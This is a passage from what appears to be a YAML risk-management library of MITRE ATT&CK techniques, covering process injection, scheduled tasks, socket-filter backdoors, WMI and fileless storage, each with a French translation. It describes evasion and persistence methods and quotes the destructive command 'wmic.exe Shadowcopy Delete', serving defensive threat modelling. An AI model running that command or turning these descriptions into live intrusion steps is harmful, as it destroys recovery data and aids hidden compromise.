  threats:
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.011
    ref_id: T1055.011
    name: Extra Window Memory Injection
    description: "Adversaries may inject malicious code into process via Extra Window\
      \ Memory (EWM) in order to evade process-based defenses as well as possibly\
      \ elevate privileges. EWM injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nBefore creating a window,\
      \ graphical Windows-based processes must prescribe to or register a windows\
      \ class, which stipulate appearance and behavior (via windows procedures, which\
      \ are functions that handle input/output of data).(Citation: Microsoft Window\
      \ Classes) Registration of new windows classes can include a request for up\
      \ to 40 bytes of EWM to be appended to the allocated memory of each instance\
      \ of that class. This EWM is intended to store data specific to that window\
      \ and has specific application programming interface (API) functions to set\
      \ and get its value. (Citation: Microsoft GetWindowLong function) (Citation:\
      \ Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough\
      \ to store a 32-bit pointer and is often used to point to a windows procedure.\
      \ Malware may possibly utilize this memory location in part of an attack chain\
      \ that includes writing code to shared sections of the process\u2019s memory,\
      \ placing a pointer to the code in EWM, then invoking execution by returning\
      \ execution control to the address in the process\u2019s EWM.\n\nExecution granted\
      \ through EWM injection may allow access to both the target process's memory\
      \ and possibly elevated privileges. Writing payloads to shared sections also\
      \ avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code>\
      \ and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July\
      \ 2017) More sophisticated malware samples may also potentially bypass protection\
      \ mechanisms such as data execution prevention (DEP) by triggering a combination\
      \ of windows procedures and other system functions that will rewrite the malicious\
      \ payload inside an executable portion of the target process.  (Citation: MalwareTech\
      \ Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\
      \nRunning code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via EWM injection may also evade detection from security products since the\
      \ execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/011"
    translations:
      fr:
        name: "Injection suppl\xE9mentaire de m\xE9moire de fen\xEAtre"
        description: "Les adversaires peuvent injecter du code malveillant dans le\
          \ processus via Extra Window Memory (EWM) afin d\u2019\xE9chapper aux d\xE9\
          fenses bas\xE9es sur les processus et \xE9ventuellement d\u2019\xE9lever\
          \ les privil\xE8ges. L\u2019injection EWM est une m\xE9thode d\u2019ex\xE9\
          cution de code arbitraire dans l\u2019espace d\u2019adressage d\u2019un\
          \ processus en direct distinct. \n\nAvant de cr\xE9er une fen\xEAtre, les\
          \ processus graphiques bas\xE9s sur Windows doivent prescrire ou enregistrer\
          \ une classe windows, qui stipule l\u2019apparence et le comportement (via\
          \ les proc\xE9dures windows, qui sont des fonctions qui g\xE8rent l\u2019\
          entr\xE9e/sortie de donn\xE9es). (Citation : Classes de fen\xEAtre Microsoft)\
          \ L\u2019inscription de nouvelles classes Windows peut inclure une demande\
          \ d\u2019ajout d\u2019un maximum de 40 octets d\u2019EWM \xE0 la m\xE9moire\
          \ allou\xE9e de chaque instance de cette classe. Cet EWM est destin\xE9\
          \ \xE0 stocker des donn\xE9es sp\xE9cifiques \xE0 cette fen\xEAtre et dispose\
          \ de fonctions d\u2019interface de programmation d\u2019application (API)\
          \ sp\xE9cifiques pour d\xE9finir et obtenir sa valeur. (Citation : Fonction\
          \ Microsoft GetWindowLong) (Citation : Fonction Microsoft SetWindowLong)\n\
          \nBien que petit, l\u2019EWM est suffisamment grand pour stocker un pointeur\
          \ 32 bits et est souvent utilis\xE9 pour pointer vers une proc\xE9dure Windows.\
          \ Les logiciels malveillants peuvent \xE9ventuellement utiliser cet emplacement\
          \ m\xE9moire dans le cadre d\u2019une cha\xEEne d\u2019attaque qui comprend\
          \ l\u2019\xE9criture de code dans des sections partag\xE9es de la m\xE9\
          moire du processus, la mise en place d\u2019un pointeur vers le code dans\
          \ EWM, puis l\u2019appel de l\u2019ex\xE9cution en renvoyant le contr\xF4\
          le d\u2019ex\xE9cution \xE0 l\u2019adresse dans l\u2019EWM du processus.\n\
          \nL\u2019ex\xE9cution accord\xE9e par l\u2019injection EWM peut permettre\
          \ l\u2019acc\xE8s \xE0 la m\xE9moire du processus cible et \xE9ventuellement\
          \ \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019\xE9criture de charges utiles\
          \ dans des sections partag\xE9es \xE9vite \xE9galement l\u2019utilisation\
          \ d\u2019appels d\u2019API hautement surveill\xE9s tels que <code>WriteProcessMemory</code>\
          \ et <code>CreateRemoteThread</code>. (Citation : Injection de processus\
          \ \xE9lastique juillet 2017) Des \xE9chantillons de logiciels malveillants\
          \ plus sophistiqu\xE9s peuvent \xE9galement contourner les m\xE9canismes\
          \ de protection tels que la pr\xE9vention de l\u2019ex\xE9cution des donn\xE9\
          es (DEP) en d\xE9clenchant une combinaison de proc\xE9dures Windows et d\u2019\
          autres fonctions syst\xE8me qui r\xE9\xE9criront la charge utile malveillante\
          \ \xE0 l\u2019int\xE9rieur d\u2019une partie ex\xE9cutable du processus\
          \ cible.  (Citation : MalwareTech Power Loader ao\xFBt 2013) (Citation :\
          \ WeLiveSecurity Gapz et Redyms mars 2013)\n\nL\u2019ex\xE9cution de code\
          \ dans le contexte d\u2019un autre processus peut permettre d\u2019acc\xE9\
          der \xE0 la m\xE9moire du processus, aux ressources syst\xE8me/r\xE9seau\
          \ et \xE9ventuellement \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9\
          cution par injection EWM peut \xE9galement \xE9chapper \xE0 la d\xE9tection\
          \ des produits de s\xE9curit\xE9, car l\u2019ex\xE9cution est masqu\xE9\
          e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.005
    ref_id: T1053.005
    name: Scheduled Task
    description: 'Adversaries may abuse the Windows Task Scheduler to perform task
      scheduling for initial or recurring execution of malicious code. There are multiple
      ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments)

      https://attack.mitre.org/techniques/T1053/005'
    translations:
      fr:
        name: "T\xE2che planifi\xE9e"
        description: "Les adversaires peuvent abuser du planificateur de t\xE2ches\
          \ Windows pour effectuer la planification de t\xE2ches pour l\u2019ex\xE9\
          cution initiale ou r\xE9currente de code malveillant. Il existe plusieurs\
          \ fa\xE7ons d\u2019acc\xE9der au planificateur de t\xE2ches dans Windows.\
          \ L\u2019utilitaire [schtasks](https://attack.mitre.org/software/S0111)\
          \ peut \xEAtre ex\xE9cut\xE9 directement sur la ligne de commande, ou le\
          \ planificateur de t\xE2ches peut \xEAtre ouvert via l\u2019interface graphique\
          \ dans la section Outils d\u2019administration du Panneau de configuration.\
          \ (Citation : d\xE9bordement de pile) Dans certains cas, les adversaires\
          \ ont utilis\xE9 un wrapper .NET pour le planificateur de t\xE2ches Windows,\
          \ tandis que les adversaires ont utilis\xE9 la biblioth\xE8que Windows netapi32\
          \ et [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
          \ (WMI) pour cr\xE9er une t\xE2che planifi\xE9e. Les adversaires peuvent\
          \ \xE9galement utiliser l\u2019applet de commande Powershell \xAB Invoke-CimMethod\
          \ \xBB, qui exploite la classe WMI \xAB PS_ScheduledTask pour cr\xE9er une\
          \ t\xE2che planifi\xE9e via un chemin d\u2019acc\xE8s XML. (Citation : Red\
          \ Canary - Atomic Red Team)\n\nUn adversaire peut utiliser le Planificateur\
          \ de t\xE2ches Windows pour ex\xE9cuter des programmes au d\xE9marrage du\
          \ syst\xE8me ou de mani\xE8re planifi\xE9e \xE0 des fins de persistance.\
          \ Le planificateur de t\xE2ches Windows peut \xE9galement \xEAtre utilis\xE9\
          \ de mani\xE8re abusive pour effectuer une ex\xE9cution \xE0 distance dans\
          \ le cadre d\u2019un mouvement lat\xE9ral et/ou pour ex\xE9cuter un processus\
          \ dans le contexte d\u2019un compte sp\xE9cifi\xE9 (tel que SYSTEM). \xC0\
          \ l\u2019instar de [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),\
          \ les adversaires ont \xE9galement abus\xE9 du planificateur de t\xE2ches\
          \ Windows pour masquer potentiellement l\u2019ex\xE9cution unique dans le\
          \ cadre de processus syst\xE8me sign\xE9s/approuv\xE9s. (Citation : ProofPoint\
          \ Serpent)\n\nLes adversaires peuvent \xE9galement cr\xE9er des t\xE2ches\
          \ planifi\xE9es \xAB cach\xE9es \xBB (c\u2019est-\xE0-dire [Masquer les\
          \ artefacts](https://attack.mitre.org/techniques/T1564)) qui peuvent ne\
          \ pas \xEAtre visibles par les outils de d\xE9fense et les requ\xEAtes manuelles\
          \ utilis\xE9es pour \xE9num\xE9rer les t\xE2ches. Plus pr\xE9cis\xE9ment,\
          \ un adversaire peut masquer une t\xE2che \xE0 l\u2019adresse \xAB schtasks\
          \ /query \xBB et au planificateur de t\xE2ches en supprimant la valeur de\
          \ registre du descripteur de s\xE9curit\xE9 (SD) associ\xE9e (lorsque la\
          \ suppression de cette valeur doit \xEAtre effectu\xE9e \xE0 l\u2019aide\
          \ des autorisations SYSTEM). (Citation : SigmaHQ)(Citation : T\xE2che planifi\xE9\
          e de Tarrask) Les adversaires peuvent \xE9galement utiliser d\u2019autres\
          \ m\xE9thodes pour masquer des t\xE2ches, telles que la modification des\
          \ m\xE9tadonn\xE9es (par exemple, la valeur \xAB Index \xBB) dans les cl\xE9\
          s de registre associ\xE9es. (Citation : D\xE9fense contre les attaques de\
          \ t\xE2ches planifi\xE9es dans les environnements Windows)\nhttps://attack.mitre.org/techniques/T1053/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.002
    ref_id: T1205.002
    name: Socket Filters
    description: 'Adversaries may attach filters to a network socket to monitor then
      activate backdoors used for persistence or command and control. With elevated
      permissions, adversaries can use features such as the `libpcap` library to open
      sockets and install filters to allow or disallow certain types of data to come
      through the socket. The filter may apply to all traffic passing through the
      specified network interface (or every interface if not specified). When the
      network interface receives a packet matching the filter criteria, additional
      actions can be triggered on the host, such as activation of a reverse shell.


      To establish a connection, an adversary sends a crafted packet to the targeted
      host that matches the installed filter criteria.(Citation: haking9 libpcap network
      sniffing) Adversaries have used these socket filters to trigger the installation
      of implants, conduct ping backs, and to invoke command shells. Communication
      with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation:
      exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May
      2020)


      Filters can be installed on any Unix-like platform with `libpcap` installed
      or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with
      `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER`
      options. Since the socket connection is not active until the packet is received,
      this behavior may be difficult to detect due to the lack of activity on a host,
      low CPU overhead, and limited visibility into raw socket usage.

      https://attack.mitre.org/techniques/T1205/002'
    translations:
      fr:
        name: Filtres de socket
        description: "Les adversaires peuvent attacher des filtres \xE0 une prise\
          \ r\xE9seau pour surveiller, puis activer des portes d\xE9rob\xE9es utilis\xE9\
          es pour la persistance ou la commande et le contr\xF4le. Avec des autorisations\
          \ \xE9lev\xE9es, les adversaires peuvent utiliser des fonctionnalit\xE9\
          s telles que la biblioth\xE8que \xAB libpcap \xBB pour ouvrir des sockets\
          \ et installer des filtres afin d\u2019autoriser ou d\u2019interdire \xE0\
          \ certains types de donn\xE9es de passer par le socket. Le filtre peut s\u2019\
          appliquer \xE0 tout le trafic passant par l\u2019interface r\xE9seau sp\xE9\
          cifi\xE9e (ou \xE0 toutes les interfaces si non sp\xE9cifi\xE9es). Lorsque\
          \ l\u2019interface r\xE9seau re\xE7oit un paquet correspondant aux crit\xE8\
          res de filtrage, des actions suppl\xE9mentaires peuvent \xEAtre d\xE9clench\xE9\
          es sur l\u2019h\xF4te, telles que l\u2019activation d\u2019un shell inverse.\n\
          \nPour \xE9tablir une connexion, un adversaire envoie un paquet contrefait\
          \ \xE0 l\u2019h\xF4te cibl\xE9 qui correspond aux crit\xE8res de filtre\
          \ install\xE9s. (Citation : haking9 libpcap reniflage du r\xE9seau) Des\
          \ adversaires ont utilis\xE9 ces filtres de socket pour d\xE9clencher l\u2019\
          installation d\u2019implants, effectuer des retours ping et invoquer des\
          \ shells de commande. La communication avec ces filtres de socket peut \xE9\
          galement \xEAtre utilis\xE9e conjointement avec le [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).\
          \ (Citation : filtres exatrack bpf portes d\xE9rob\xE9es passives)(Citation\
          \ : Leonardo Turla Penquin, mai 2020)\n\nLes filtres peuvent \xEAtre install\xE9\
          s sur n\u2019importe quelle plate-forme de type Unix avec 'libpcap' install\xE9\
          \ ou sur des h\xF4tes Windows utilisant 'Winpcap'.  Les adversaires peuvent\
          \ utiliser soit 'libpcap' avec 'pcap_setfilter', soit la fonction de biblioth\xE8\
          que standard 'setsockopt' avec les options 'SO_ATTACH_FILTER. \xC9tant donn\xE9\
          \ que la connexion de socket n\u2019est pas active tant que le paquet n\u2019\
          est pas re\xE7u, ce comportement peut \xEAtre difficile \xE0 d\xE9tecter\
          \ en raison de l\u2019absence d\u2019activit\xE9 sur un h\xF4te, d\u2019\
          une faible surcharge de processeur et d\u2019une visibilit\xE9 limit\xE9\
          e sur l\u2019utilisation brute du socket.\nhttps://attack.mitre.org/techniques/T1205/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.001
    ref_id: T1560.001
    name: Archive via Utility
    description: "Adversaries may use utilities to compress and/or encrypt collected\
      \ data prior to exfiltration. Many utilities include functionalities to compress,\
      \ encrypt, or otherwise package data into a format that is easier/more secure\
      \ to transport.\n\nAdversaries may abuse various utilities to compress or encrypt\
      \ data before exfiltration. Some third party utilities may be preinstalled,\
      \ such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows\
      \ systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may\
      \ be used to package collected files into a cabinet (.cab) file. <code>diantz</code>\
      \ may also be used to download and compress files from remote locations (i.e.\
      \ [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation:\
      \ diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories\
      \ with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160)\
      \ to Base64 encode collected data before exfiltration. \n\nAdversaries may use\
      \ also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform\
      \ similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation:\
      \ WinZip Homepage)\nhttps://attack.mitre.org/techniques/T1560/001"
    translations:
      fr:
        name: "Archiver via l\u2019utilitaire"
        description: "Les adversaires peuvent utiliser des utilitaires pour compresser\
          \ et/ou chiffrer les donn\xE9es collect\xE9es avant l\u2019exfiltration.\
          \ De nombreux utilitaires incluent des fonctionnalit\xE9s permettant de\
          \ compresser, de chiffrer ou d\u2019empaqueter les donn\xE9es dans un format\
          \ plus facile et plus s\xFBr \xE0 transporter.\n\nLes adversaires peuvent\
          \ abuser de divers utilitaires pour compresser ou crypter les donn\xE9es\
          \ avant de les exfiltrer. Certains utilitaires tiers peuvent \xEAtre pr\xE9\
          install\xE9s, tels que <code>tar</code> sur Linux et macOS ou <code>zip</code>\
          \ sur les syst\xE8mes Windows. \n\nSous Windows, <code>diantz</code> ou\
          \ <code> makecab</code> peuvent \xEAtre utilis\xE9s pour empaqueter les\
          \ fichiers collect\xE9s dans un fichier armoire (.cab). <code>diantz</code>\
          \ peut \xE9galement \xEAtre utilis\xE9 pour t\xE9l\xE9charger et compresser\
          \ des fichiers \xE0 partir d\u2019emplacements distants (c\u2019est-\xE0\
          -dire [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).\
          \ (R\xE9f\xE9rence : diantz.exe_lolbas) <code>xcopy</code> sous Windows\
          \ peut copier des fichiers et des r\xE9pertoires avec une vari\xE9t\xE9\
          \ d\u2019options. De plus, les adversaires peuvent utiliser [certutil](https://attack.mitre.org/software/S0160)\
          \ pour encoder en Base64 les donn\xE9es collect\xE9es avant l\u2019exfiltration.\
          \ \n\nLes adversaires peuvent \xE9galement utiliser des utilitaires tiers,\
          \ tels que 7-Zip, WinRAR et WinZip, pour effectuer des activit\xE9s similaires.\
          \ (Citation\_: page d\u2019accueil 7zip)(Citation : Page d\u2019accueil\
          \ de WinRAR)(Citation : Page d\u2019accueil de WinZip)\nhttps://attack.mitre.org/techniques/T1560/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.005
    ref_id: T1021.005
    name: VNC
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to remotely control machines using Virtual Network Computing (VNC).  VNC is\
      \ a platform-independent desktop sharing system that uses the RFB (\u201Cremote\
      \ framebuffer\u201D) protocol to enable users to remotely control another computer\u2019\
      s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation:\
      \ The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ as VNC is screen-sharing software rather than resource-sharing software. By\
      \ default, VNC uses the system's authentication, but it can be configured to\
      \ use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation:\
      \ VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions\
      \ as the logged-on user such as opening documents, downloading files, and running\
      \ arbitrary commands. An adversary could use VNC to remotely control and monitor\
      \ a system to collect data and information to pivot to other systems within\
      \ the network. Specific VNC libraries/implementations have also been susceptible\
      \ to brute force attacks and memory usage exploitation.(Citation: Hijacking\
      \ VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC\
      \ Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation:\
      \ Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)\nhttps://attack.mitre.org/techniques/T1021/005"
    translations:
      fr:
        name: VNC
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour contr\xF4ler \xE0 distance des machines \xE0 l\u2019aide de l\u2019\
          informatique de r\xE9seau virtuel (VNC).  VNC est un syst\xE8me de partage\
          \ de bureau ind\xE9pendant de la plate-forme qui utilise le protocole RFB\
          \ (\xAB remote framebuffer \xBB) pour permettre aux utilisateurs de contr\xF4\
          ler \xE0 distance l\u2019affichage d\u2019un autre ordinateur en relayant\
          \ les entr\xE9es d\u2019\xE9cran, de souris et de clavier sur le r\xE9seau.\
          \ (Citation : Le protocole Framebuffer \xE0 distance)\n\nVNC diff\xE8re\
          \ du [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
          \ car VNC est un logiciel de partage d\u2019\xE9cran plut\xF4t qu\u2019\
          un logiciel de partage de ressources. Par d\xE9faut, VNC utilise l\u2019\
          authentification du syst\xE8me, mais il peut \xEAtre configur\xE9 pour utiliser\
          \ des informations d\u2019identification sp\xE9cifiques \xE0 VNC. (Citation\
          \ : Logiciel MacOS VNC pour le bureau \xE0 distance)(Citation : Authentification\
          \ VNC)\n\nLes adversaires peuvent abuser de VNC pour effectuer des actions\
          \ malveillantes en tant qu\u2019utilisateur connect\xE9, telles que l\u2019\
          ouverture de documents, le t\xE9l\xE9chargement de fichiers et l\u2019ex\xE9\
          cution de commandes arbitraires. Un adversaire pourrait utiliser VNC pour\
          \ contr\xF4ler et surveiller \xE0 distance un syst\xE8me afin de collecter\
          \ des donn\xE9es et des informations afin de pivoter vers d\u2019autres\
          \ syst\xE8mes au sein du r\xE9seau. Des biblioth\xE8ques/impl\xE9mentations\
          \ VNC sp\xE9cifiques ont \xE9galement \xE9t\xE9 sensibles aux attaques par\
          \ force brute et \xE0 l\u2019exploitation de l\u2019utilisation de la m\xE9\
          moire. (Citation : D\xE9tournement de VNC)(Citation : Connexion racine macOS\
          \ VNC sans authentification)(Citation : Vuln\xE9rabilit\xE9s VNC)(Citation\
          \ : V\xE9rification de l\u2019authentification VNC de s\xE9curit\xE9 offensive)(Citation\
          \ : Attaque des serveurs VNC PentestLab)(Citation : Bug d\u2019authentification\
          \ de La Havane)\nhttps://attack.mitre.org/techniques/T1021/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1047
    ref_id: T1047
    name: Windows Management Instrumentation
    description: "Adversaries may abuse Windows Management Instrumentation (WMI) to\
      \ execute malicious commands and payloads. WMI is designed for programmers and\
      \ is the infrastructure for management data and operations on Windows systems.(Citation:\
      \ WMI 1-3) WMI is an administration feature that provides a uniform environment\
      \ to access Windows system components.\n\nThe WMI service enables both local\
      \ and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
      \ and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation:\
      \ WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM\
      \ operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI\
      \ 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with\
      \ local and remote systems and use it as a means to execute various behaviors,\
      \ such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007)\
      \ as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands\
      \ and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused\
      \ by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy\
      \ Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation:\
      \ WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the\
      \ WMIC feature being \u201Cdisabled by default\u201D on Windows 11+. WMIC will\
      \ be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell\
      \ and tools like `wbemtool.exe`, COM APIs can also be used to programmatically\
      \ interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)\nhttps://attack.mitre.org/techniques/T1047"
    translations:
      fr:
        name: Instrumentation de gestion Windows
        description: "Les adversaires peuvent abuser de Windows Management Instrumentation\
          \ (WMI) pour ex\xE9cuter des commandes et des charges utiles malveillantes.\
          \ WMI est con\xE7u pour les programmeurs et constitue l\u2019infrastructure\
          \ pour la gestion, les donn\xE9es et les op\xE9rations sur les syst\xE8\
          mes Windows. (R\xE9f\xE9rence : WMI 1-3) WMI est une fonctionnalit\xE9 d\u2019\
          administration qui fournit un environnement uniforme pour acc\xE9der aux\
          \ composants du syst\xE8me Windows.\n\nLe service WMI permet un acc\xE8\
          s local et distant, bien que ce dernier soit facilit\xE9 par les [Services\
          \ \xE0 distance](https://attack.mitre.org/techniques/T1021) tels que [Mod\xE8\
          le objet de composant distribu\xE9](https://attack.mitre.org/techniques/T1021/003)\
          \ et [Gestion \xE0 distance Windows](https://attack.mitre.org/techniques/T1021/006).\
          \ (R\xE9f\xE9rence : WMI 1-3) WMI distant sur DCOM fonctionne \xE0 l\u2019\
          aide du port 135, tandis que WMI sur WinRM fonctionne sur le port 5985 lors\
          \ de l\u2019utilisation de HTTP et 5986 pour HTTPS. (R\xE9f\xE9rence : WMI\
          \ 1-3) (Citation : Mandiant WMI)\n\nUn adversaire peut utiliser WMI pour\
          \ interagir avec des syst\xE8mes locaux et distants et l\u2019utiliser comme\
          \ moyen d\u2019ex\xE9cuter divers comportements, tels que la collecte d\u2019\
          informations pour [Discovery](https://attack.mitre.org/tactics/TA0007) ainsi\
          \ que [Execution](https://attack.mitre.org/tactics/TA0002) de commandes\
          \ et de charges utiles. (Citation : Mandiant WMI) Par exemple, un adversaire\
          \ peut abuser de 'wmic.exe' pour supprimer des clich\xE9s instantan\xE9\
          s avec la commande 'wmic.exe Shadowcopy Delete' (c\u2019est-\xE0-dire, [Inhibit\
          \ System Recovery](https://attack.mitre.org/techniques/T1490)). (R\xE9f\xE9\
          rence : WMI 6)\n\n**Remarque\_:** 'wmic.exe' est obsol\xE8te \xE0 partir\
          \ de janvier 2024, la fonctionnalit\xE9 WMIC \xE9tant \xAB\_d\xE9sactiv\xE9\
          e par d\xE9faut\_\xBB sur Windows 11+. WMIC sera supprim\xE9 des versions\
          \ ult\xE9rieures de Windows et remplac\xE9 par [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ en tant qu\u2019interface WMI principale. (R\xE9f\xE9rence : WMI 7,8)\
          \ En plus de PowerShell et d\u2019outils tels que 'wbemtool.exe', les API\
          \ COM peuvent \xE9galement \xEAtre utilis\xE9es pour interagir de mani\xE8\
          re programmatique avec WMI via C++, .NET, VBScript, etc.\nhttps://attack.mitre.org/techniques/T1047"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1113
    ref_id: T1113
    name: Screen Capture
    description: 'Adversaries may attempt to take screen captures of the desktop to
      gather information over the course of an operation. Screen capturing functionality
      may be included as a feature of a remote access tool used in post-compromise
      operations. Taking a screenshot is also typically possible through native utilities
      or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation:
      CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

      https://attack.mitre.org/techniques/T1113'
    translations:
      fr:
        name: "Capture d\u2019\xE9cran"
        description: "Les adversaires peuvent tenter de faire des captures d\u2019\
          \xE9cran du bureau pour recueillir des informations au cours d\u2019une\
          \ op\xE9ration. La fonctionnalit\xE9 de capture d\u2019\xE9cran peut \xEA\
          tre incluse dans un outil d\u2019acc\xE8s \xE0 distance utilis\xE9 dans\
          \ les op\xE9rations post-compromission. Il est \xE9galement g\xE9n\xE9ralement\
          \ possible de faire une capture d\u2019\xE9cran \xE0 l\u2019aide d\u2019\
          utilitaires natifs ou d\u2019appels d\u2019API, tels que <code>CopyFromScreen</code>,\
          \ <code>xwd</code> ou <code>capture d\u2019\xE9cran</code>. (Citation :\
          \ CopyFromScreen .NET)(Citation : Logiciel malveillant Mac obsol\xE8te)\n\
          https://attack.mitre.org/techniques/T1113"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.011
    ref_id: T1027.011
    name: Fileless Storage
    description: 'Adversaries may store data in "fileless" formats to conceal malicious
      activity from defenses. Fileless storage can be broadly defined as any format
      other than a file. Common examples of non-volatile fileless storage in Windows
      systems include the Windows Registry, event logs, or WMI repository.(Citation:
      Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared
      memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`
      may also be considered fileless storage, as files written to these directories
      are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary
      Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation:
      Aquasec Muhstik Malware 2024)


      Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620)
      and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless
      data storage may remain undetected by anti-virus and other endpoint security
      tools that can only access specific file formats from disk storage. Leveraging
      fileless storage may also allow adversaries to bypass the protections offered
      by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)


      Adversaries may use fileless storage to conceal various types of stored data,
      including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003))
      and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).
      Adversaries also often encrypt, encode, splice, or otherwise obfuscate this
      fileless data when stored.


      Some forms of fileless storage activity may indirectly create artifacts in the
      file system, but in central and otherwise difficult to inspect formats such
      as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g.,
      `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless)

      https://attack.mitre.org/techniques/T1027/011'
    translations:
      fr:
        name: Stockage sans fichier
        description: "Les adversaires peuvent stocker des donn\xE9es dans des formats\
          \ \xAB sans fichier \xBB pour dissimuler les activit\xE9s malveillantes\
          \ aux d\xE9fenses. Le stockage sans fichier peut \xEAtre d\xE9fini de mani\xE8\
          re g\xE9n\xE9rale comme tout format autre qu\u2019un fichier. Parmi les\
          \ exemples courants de stockage sans fichier non volatile dans les syst\xE8\
          mes Windows, citons le registre Windows, les journaux d\u2019\xE9v\xE9nements\
          \ ou le r\xE9f\xE9rentiel WMI. (Citation : Microsoft Fileless)(Citation\
          \ : SecureList sans fichier) Dans les syst\xE8mes Linux, les r\xE9pertoires\
